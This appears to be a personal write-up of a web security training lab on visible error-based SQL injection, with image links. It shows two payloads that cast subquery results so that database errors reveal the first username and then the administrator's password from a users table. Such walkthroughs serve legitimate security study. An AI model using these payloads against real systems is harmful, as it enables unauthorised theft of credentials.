# Detection

The lab gives the injection point and useful information regarding the database structure, confirm the injection point:

![[injection-point.png]]


# Exploitation

The following payload will tell us the first record of the `username` column in the `users` table:

```
'||CAST((SELECT username FROM users LIMIT 1)
```

![[error-username.png]]

Knowing the `administrator` is the first record, just retrieve the password the same way:

```
'||CAST((SELECT password FROM users LIMIT 1)
```

![[SQLInjection/Attacks/Blind SQL injection/Error Based SQL injection/labs/Visible error-based SQL injection/images/password.png]]

